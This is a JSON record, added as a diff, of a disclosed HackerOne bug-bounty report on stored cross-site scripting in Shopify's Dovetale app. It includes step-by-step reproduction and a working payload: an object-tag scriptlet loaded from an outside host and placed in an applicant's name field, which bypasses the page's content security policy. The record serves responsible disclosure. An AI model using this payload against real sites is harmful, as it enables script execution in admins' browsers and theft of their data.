@@ -1,0 +1,250 @@
+{
+  "id": 1652046,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjUyMDQ2",
+  "url": "https://hackerone.com/reports/1652046",
+  "title": "Stored XSS in Dovetale by application of creator",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-27T20:07:45.753Z",
+  "submitted_at": "2022-07-27T20:07:45.869Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kun_19",
+    "url": "/kun_19",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/M8SJ4S6QmGRoPZP9fGQYupea/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-11-29T17:34:44.228Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-22T15:05:33.402Z",
+  "team_member_agreed_on_going_public_at": "2022-11-29T17:34:44.097Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nDovetale is an influencer platform from Shopify to manage and scale influencer marketing. The influencers can become an ambassador of the brand and  are able to apply for it. If a malicious creator applies with XSS payloads inside the  first name, last name, etc., the data  is stored and presented to the admins of the brand within the application area of Dovetale. The HTML-/JavaScript is finally triggered, when the admin is approving the application.\n\n## Shops Used to Test:\n19kun-24.myshopify.com\n\n## Steps To Reproduce:\n\n**Preconditions**: A \"real\" subscription for a Shopify plan (e.g. Basic Plan) is needed to get applications / manage  applicants. The creation of a development store is somehow not sufficient.\n\n  1. (Victim) Install the Dovetale app for your store, create the Dovetale account and link it to your specific store.\n  2. (Victim) Create an appropriate application page and copy the application link for becoming an ambassador (see F1841622)\n  3. (Attacker) Open the link in a new browser instance and follow the application procedure. Apply for example with an existing Instagram account and...\n  4. (Attacker) ...now it's time to fill out your personal data. Use for your last name the XSS payload `<object type=\"text/x-scriptlet\" data=\"https://xss.rocks/scriptlet.html\"></object>` according to the screenshot below:  \n{F1841624}\n  5. (Attacker) Finish and submit the application. Afterwards you have to verify the email address and then you're good.\n  6. (Victim) You should now have received the application. Click on \"Approve\" ...  \n{F1841627}\n  7. (Victim) ...you are are now able to create the welcome email (see F1841629). The XSS payload doesn't trigger here because of the sanitization of the trip editor, but if you click \"Next Welcome package\" > \"Next Review\", the email is shown again and the JavaScript code is executed:  \n{F1841634}\n\n**Note:** The defined Content Security Policy of the page was successfully bypassed by using the `object` tag as this is not prevented by the policy.\n\n## Impact\n\n- Execution of JavaScript code in the victim's (e.g. Dovetale Account Owner) browser\n- Exfiltration of confidential data. It's also possible to steal data of other applicants or data such as CSRF-Tokens etc. (I can also proof / show such an attack)\n- Defacing of the site through HTML injection\n- Phishing",
+  "bounty_amount": "1600.0",
+  "formatted_bounty": "$1,600",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1841622,
+      "file_name": "application_link.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pmy0i5l9deaqqn08infsr42ovjsu?response-content-disposition=attachment%3B%20filename%3D%22application_link.png%22%3B%20filename%2A%3DUTF-8%27%27application_link.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYUPJRCED%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIC0Iuk2Zcgw0fuOvhOpS%2FrUDbnT7OO0XQfIsb3ElaDpfAiAzwEnW96%2B9K7jLKr314kPqebzuilHyfXuIL63vPZIDKyqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMHzvCN6%2F7czCY5WEWKo4Ft6xJZqlytIps%2BkTeFOsmGm3IOBQt8QBhJ5r6MBd7BF7QbuVv%2B08k8MrPfL%2BxacyiJO%2FOxcKpE0TcpvhG%2BnQwwAAf7ywFxinzvYIoXG0e7xYzXkdRQSUwWgSql3KRlJEfpwhC1aUyhCeDgS%2FiA9SQpQV8NsXJcHh4JinYPJDXlasNDdS30eJzSrGHWEWjxXMibBYpIk3So4U%2Fx7qAxWjRWdIfyHfdmYPmIB%2F%2FOcxa3dgrZl%2BcIqjPjrQqtvmXabXykT9nc2AmXOlOw8d5Zn70xAM4L5sp8e1CbvJOAOSmuq6KFOOvY%2BXrd9z8qXa5qkiPVMm4q0YY401Lf%2Bq7lh41kezkYsFjkVrcYdMEohPa2nS8GOfubB8%2Fgr%2FBYZpwWFcmxowq8lSc2SHVd6dEyFn%2FDjINrgrgs5UuTh1lVrieSG9YQxL4eRQMzh%2F%2B1Yam3AlAEBs%2Bkw7PkeToVWJHtF7L9GXhJhq606ZR%2BW9kIR97wfDxn2ule82KOpegWm%2FqS%2FD8bMiKaWT81T56jQWCoMt8v163ympFeTerVmrzS4vEJFnT5rK2bKEnA%2FJLe4JpeMzETlSpMh5fSkC%2BchNWfJBW07fLKYalBkLjewl6%2FUDXRC7cIxCQCfg7jJ0UhEBGuxokR4GacGFEM85WbOjQmwqoGjIhJX%2ByfyIoIOPq8cLkinDY7ytheg1AtsAbSJjnVVA3fo9iqIbSu%2Fcg4Ux8Nb3Xpuq5oJBe0G%2F0W5U%2BcraQHXQuSpPeV18aDona6j9sMGPy66om3GRFbNWvx0nUUoZM%2BI6VjcEPKReC3SCjaP%2B7Ky6A3SHcw5sx4jrrh4a0n4Wq9nUDRf7DtCMX0b%2FWA8tzrDej%2FagzZLNDxvSvGbigMLHwnNIGOrIBdz2%2FQxZw2PPvym3E6h4x0xxxXX8fHLq6aASKuv8Zs2r%2B4Qcm%2BYPO977UApYikbFYCb8BtrAPbkBVPstRg121r7omw6MnGdSJmmCqL1TgqMGpPByKj3sgCFaoS9fMPrxCFepwXuPIgKqVTdCrz30pt9hRtnutCA9wZuFheBq%2BenhOKPV1a9WHiEPr0mu0TwJWj3Ra9%2FNtd2ml29tH6%2FjQul%2BRSYjDhYTDpgDD7AXAJbHG6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029f0640aae14b636241f182dfa8ddfb00dbda3bbe08b7078d246d6dafdede9a",
+      "file_size": 371926,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1841624,
+      "file_name": "application_xss_payload.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lvijcqomku1shgmra9q2aqxa44g7?response-content-disposition=attachment%3B%20filename%3D%22application_xss_payload.png%22%3B%20filename%2A%3DUTF-8%27%27application_xss_payload.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYUPJRCED%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIC0Iuk2Zcgw0fuOvhOpS%2FrUDbnT7OO0XQfIsb3ElaDpfAiAzwEnW96%2B9K7jLKr314kPqebzuilHyfXuIL63vPZIDKyqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMHzvCN6%2F7czCY5WEWKo4Ft6xJZqlytIps%2BkTeFOsmGm3IOBQt8QBhJ5r6MBd7BF7QbuVv%2B08k8MrPfL%2BxacyiJO%2FOxcKpE0TcpvhG%2BnQwwAAf7ywFxinzvYIoXG0e7xYzXkdRQSUwWgSql3KRlJEfpwhC1aUyhCeDgS%2FiA9SQpQV8NsXJcHh4JinYPJDXlasNDdS30eJzSrGHWEWjxXMibBYpIk3So4U%2Fx7qAxWjRWdIfyHfdmYPmIB%2F%2FOcxa3dgrZl%2BcIqjPjrQqtvmXabXykT9nc2AmXOlOw8d5Zn70xAM4L5sp8e1CbvJOAOSmuq6KFOOvY%2BXrd9z8qXa5qkiPVMm4q0YY401Lf%2Bq7lh41kezkYsFjkVrcYdMEohPa2nS8GOfubB8%2Fgr%2FBYZpwWFcmxowq8lSc2SHVd6dEyFn%2FDjINrgrgs5UuTh1lVrieSG9YQxL4eRQMzh%2F%2B1Yam3AlAEBs%2Bkw7PkeToVWJHtF7L9GXhJhq606ZR%2BW9kIR97wfDxn2ule82KOpegWm%2FqS%2FD8bMiKaWT81T56jQWCoMt8v163ympFeTerVmrzS4vEJFnT5rK2bKEnA%2FJLe4JpeMzETlSpMh5fSkC%2BchNWfJBW07fLKYalBkLjewl6%2FUDXRC7cIxCQCfg7jJ0UhEBGuxokR4GacGFEM85WbOjQmwqoGjIhJX%2ByfyIoIOPq8cLkinDY7ytheg1AtsAbSJjnVVA3fo9iqIbSu%2Fcg4Ux8Nb3Xpuq5oJBe0G%2F0W5U%2BcraQHXQuSpPeV18aDona6j9sMGPy66om3GRFbNWvx0nUUoZM%2BI6VjcEPKReC3SCjaP%2B7Ky6A3SHcw5sx4jrrh4a0n4Wq9nUDRf7DtCMX0b%2FWA8tzrDej%2FagzZLNDxvSvGbigMLHwnNIGOrIBdz2%2FQxZw2PPvym3E6h4x0xxxXX8fHLq6aASKuv8Zs2r%2B4Qcm%2BYPO977UApYikbFYCb8BtrAPbkBVPstRg121r7omw6MnGdSJmmCqL1TgqMGpPByKj3sgCFaoS9fMPrxCFepwXuPIgKqVTdCrz30pt9hRtnutCA9wZuFheBq%2BenhOKPV1a9WHiEPr0mu0TwJWj3Ra9%2FNtd2ml29tH6%2FjQul%2BRSYjDhYTDpgDD7AXAJbHG6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7c95e1973a4d84124c6a5d723d35fd71a2bc19ab539a500cf1131790468638af",
+      "file_size": 138201,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1841627,
+      "file_name": "approve_application.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/csh3xhahi63nlfzec2hko1o0vh7e?response-content-disposition=attachment%3B%20filename%3D%22approve_application.png%22%3B%20filename%2A%3DUTF-8%27%27approve_application.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYUPJRCED%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIC0Iuk2Zcgw0fuOvhOpS%2FrUDbnT7OO0XQfIsb3ElaDpfAiAzwEnW96%2B9K7jLKr314kPqebzuilHyfXuIL63vPZIDKyqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMHzvCN6%2F7czCY5WEWKo4Ft6xJZqlytIps%2BkTeFOsmGm3IOBQt8QBhJ5r6MBd7BF7QbuVv%2B08k8MrPfL%2BxacyiJO%2FOxcKpE0TcpvhG%2BnQwwAAf7ywFxinzvYIoXG0e7xYzXkdRQSUwWgSql3KRlJEfpwhC1aUyhCeDgS%2FiA9SQpQV8NsXJcHh4JinYPJDXlasNDdS30eJzSrGHWEWjxXMibBYpIk3So4U%2Fx7qAxWjRWdIfyHfdmYPmIB%2F%2FOcxa3dgrZl%2BcIqjPjrQqtvmXabXykT9nc2AmXOlOw8d5Zn70xAM4L5sp8e1CbvJOAOSmuq6KFOOvY%2BXrd9z8qXa5qkiPVMm4q0YY401Lf%2Bq7lh41kezkYsFjkVrcYdMEohPa2nS8GOfubB8%2Fgr%2FBYZpwWFcmxowq8lSc2SHVd6dEyFn%2FDjINrgrgs5UuTh1lVrieSG9YQxL4eRQMzh%2F%2B1Yam3AlAEBs%2Bkw7PkeToVWJHtF7L9GXhJhq606ZR%2BW9kIR97wfDxn2ule82KOpegWm%2FqS%2FD8bMiKaWT81T56jQWCoMt8v163ympFeTerVmrzS4vEJFnT5rK2bKEnA%2FJLe4JpeMzETlSpMh5fSkC%2BchNWfJBW07fLKYalBkLjewl6%2FUDXRC7cIxCQCfg7jJ0UhEBGuxokR4GacGFEM85WbOjQmwqoGjIhJX%2ByfyIoIOPq8cLkinDY7ytheg1AtsAbSJjnVVA3fo9iqIbSu%2Fcg4Ux8Nb3Xpuq5oJBe0G%2F0W5U%2BcraQHXQuSpPeV18aDona6j9sMGPy66om3GRFbNWvx0nUUoZM%2BI6VjcEPKReC3SCjaP%2B7Ky6A3SHcw5sx4jrrh4a0n4Wq9nUDRf7DtCMX0b%2FWA8tzrDej%2FagzZLNDxvSvGbigMLHwnNIGOrIBdz2%2FQxZw2PPvym3E6h4x0xxxXX8fHLq6aASKuv8Zs2r%2B4Qcm%2BYPO977UApYikbFYCb8BtrAPbkBVPstRg121r7omw6MnGdSJmmCqL1TgqMGpPByKj3sgCFaoS9fMPrxCFepwXuPIgKqVTdCrz30pt9hRtnutCA9wZuFheBq%2BenhOKPV1a9WHiEPr0mu0TwJWj3Ra9%2FNtd2ml29tH6%2FjQul%2BRSYjDhYTDpgDD7AXAJbHG6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1c68a8e390082c298f621737c5b58a54936fb56abf9b7cd6ad5012945f44cc81",
+      "file_size": 266400,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1841629,
+      "file_name": "trix_editor.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2bwwyegu4ncouf8ac8p9szx0l2hr?response-content-disposition=attachment%3B%20filename%3D%22trix_editor.png%22%3B%20filename%2A%3DUTF-8%27%27trix_editor.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYUPJRCED%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIC0Iuk2Zcgw0fuOvhOpS%2FrUDbnT7OO0XQfIsb3ElaDpfAiAzwEnW96%2B9K7jLKr314kPqebzuilHyfXuIL63vPZIDKyqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMHzvCN6%2F7czCY5WEWKo4Ft6xJZqlytIps%2BkTeFOsmGm3IOBQt8QBhJ5r6MBd7BF7QbuVv%2B08k8MrPfL%2BxacyiJO%2FOxcKpE0TcpvhG%2BnQwwAAf7ywFxinzvYIoXG0e7xYzXkdRQSUwWgSql3KRlJEfpwhC1aUyhCeDgS%2FiA9SQpQV8NsXJcHh4JinYPJDXlasNDdS30eJzSrGHWEWjxXMibBYpIk3So4U%2Fx7qAxWjRWdIfyHfdmYPmIB%2F%2FOcxa3dgrZl%2BcIqjPjrQqtvmXabXykT9nc2AmXOlOw8d5Zn70xAM4L5sp8e1CbvJOAOSmuq6KFOOvY%2BXrd9z8qXa5qkiPVMm4q0YY401Lf%2Bq7lh41kezkYsFjkVrcYdMEohPa2nS8GOfubB8%2Fgr%2FBYZpwWFcmxowq8lSc2SHVd6dEyFn%2FDjINrgrgs5UuTh1lVrieSG9YQxL4eRQMzh%2F%2B1Yam3AlAEBs%2Bkw7PkeToVWJHtF7L9GXhJhq606ZR%2BW9kIR97wfDxn2ule82KOpegWm%2FqS%2FD8bMiKaWT81T56jQWCoMt8v163ympFeTerVmrzS4vEJFnT5rK2bKEnA%2FJLe4JpeMzETlSpMh5fSkC%2BchNWfJBW07fLKYalBkLjewl6%2FUDXRC7cIxCQCfg7jJ0UhEBGuxokR4GacGFEM85WbOjQmwqoGjIhJX%2ByfyIoIOPq8cLkinDY7ytheg1AtsAbSJjnVVA3fo9iqIbSu%2Fcg4Ux8Nb3Xpuq5oJBe0G%2F0W5U%2BcraQHXQuSpPeV18aDona6j9sMGPy66om3GRFbNWvx0nUUoZM%2BI6VjcEPKReC3SCjaP%2B7Ky6A3SHcw5sx4jrrh4a0n4Wq9nUDRf7DtCMX0b%2FWA8tzrDej%2FagzZLNDxvSvGbigMLHwnNIGOrIBdz2%2FQxZw2PPvym3E6h4x0xxxXX8fHLq6aASKuv8Zs2r%2B4Qcm%2BYPO977UApYikbFYCb8BtrAPbkBVPstRg121r7omw6MnGdSJmmCqL1TgqMGpPByKj3sgCFaoS9fMPrxCFepwXuPIgKqVTdCrz30pt9hRtnutCA9wZuFheBq%2BenhOKPV1a9WHiEPr0mu0TwJWj3Ra9%2FNtd2ml29tH6%2FjQul%2BRSYjDhYTDpgDD7AXAJbHG6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cf9c841d6ec4261fe3fce017f5558ec1e2b973e2490e3359a2092395fa0e049f",
+      "file_size": 202001,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1841634,
+      "file_name": "xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t53iv2mo74g2hlii602g4w8supfi?response-content-disposition=attachment%3B%20filename%3D%22xss.png%22%3B%20filename%2A%3DUTF-8%27%27xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYUPJRCED%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIC0Iuk2Zcgw0fuOvhOpS%2FrUDbnT7OO0XQfIsb3ElaDpfAiAzwEnW96%2B9K7jLKr314kPqebzuilHyfXuIL63vPZIDKyqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMHzvCN6%2F7czCY5WEWKo4Ft6xJZqlytIps%2BkTeFOsmGm3IOBQt8QBhJ5r6MBd7BF7QbuVv%2B08k8MrPfL%2BxacyiJO%2FOxcKpE0TcpvhG%2BnQwwAAf7ywFxinzvYIoXG0e7xYzXkdRQSUwWgSql3KRlJEfpwhC1aUyhCeDgS%2FiA9SQpQV8NsXJcHh4JinYPJDXlasNDdS30eJzSrGHWEWjxXMibBYpIk3So4U%2Fx7qAxWjRWdIfyHfdmYPmIB%2F%2FOcxa3dgrZl%2BcIqjPjrQqtvmXabXykT9nc2AmXOlOw8d5Zn70xAM4L5sp8e1CbvJOAOSmuq6KFOOvY%2BXrd9z8qXa5qkiPVMm4q0YY401Lf%2Bq7lh41kezkYsFjkVrcYdMEohPa2nS8GOfubB8%2Fgr%2FBYZpwWFcmxowq8lSc2SHVd6dEyFn%2FDjINrgrgs5UuTh1lVrieSG9YQxL4eRQMzh%2F%2B1Yam3AlAEBs%2Bkw7PkeToVWJHtF7L9GXhJhq606ZR%2BW9kIR97wfDxn2ule82KOpegWm%2FqS%2FD8bMiKaWT81T56jQWCoMt8v163ympFeTerVmrzS4vEJFnT5rK2bKEnA%2FJLe4JpeMzETlSpMh5fSkC%2BchNWfJBW07fLKYalBkLjewl6%2FUDXRC7cIxCQCfg7jJ0UhEBGuxokR4GacGFEM85WbOjQmwqoGjIhJX%2ByfyIoIOPq8cLkinDY7ytheg1AtsAbSJjnVVA3fo9iqIbSu%2Fcg4Ux8Nb3Xpuq5oJBe0G%2F0W5U%2BcraQHXQuSpPeV18aDona6j9sMGPy66om3GRFbNWvx0nUUoZM%2BI6VjcEPKReC3SCjaP%2B7Ky6A3SHcw5sx4jrrh4a0n4Wq9nUDRf7DtCMX0b%2FWA8tzrDej%2FagzZLNDxvSvGbigMLHwnNIGOrIBdz2%2FQxZw2PPvym3E6h4x0xxxXX8fHLq6aASKuv8Zs2r%2B4Qcm%2BYPO977UApYikbFYCb8BtrAPbkBVPstRg121r7omw6MnGdSJmmCqL1TgqMGpPByKj3sgCFaoS9fMPrxCFepwXuPIgKqVTdCrz30pt9hRtnutCA9wZuFheBq%2BenhOKPV1a9WHiEPr0mu0TwJWj3Ra9%2FNtd2ml29tH6%2FjQul%2BRSYjDhYTDpgDD7AXAJbHG6Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1202068455f27d386c169147033f8ffa6982c230e46bc349050677ec049b33fc",
+      "file_size": 269751,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 34,
+  "voters": [
+    "gankd",
+    "jumpydata",
+    "p4n7h3rx",
+    "n1m0",
+    "tolga",
+    "drsniper",
+    "mattberg",
+    "zy9ard3",
+    "address_below0",
+    "shreyaschavhan",
+    "and 24 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 37198,
+    "asset_type": "OTHER",
+    "asset_identifier": "Shopify Developed Apps",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1652046",
+  "votes": 34,
+  "latest_disclosable_activity_at": "2022-11-29T17:34:44.285Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:02:33.129371",
+    "source": "https://hackerone.com/reports/1652046.json",
+    "report_id": 1652046
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjUyMDQ2",
+    "databaseId": "1652046",
+    "title": "Stored XSS in Dovetale by application of creator",
+    "url": "https://hackerone.com/reports/1652046",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-11-29T17:34:44.228Z",
+    "created_at": "2022-07-27T20:07:45.753Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYy",
+      "name": "Cross-site Scripting (XSS) - Stored",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 4.2
+    },
+    "reporter": {
+      "username": "kun_19"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MTQxNjI=",
+            "amount": "1600.00",
+            "awarded_amount": "1600.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2022-08-08T17:56:17.688Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE2NTIwNDY=",
+    "_id": "1652046",
+    "disclosed": true,
+    "votes": 34,
+    "latest_disclosable_activity_at": "2022-11-29T17:34:44.285Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjUyMDQ2",
+      "databaseId": "1652046",
+      "title": "Stored XSS in Dovetale by application of creator",
+      "url": "https://hackerone.com/reports/1652046",
+      "disclosed_at": "2022-11-29T17:34:44.228Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    }
+  }
+}
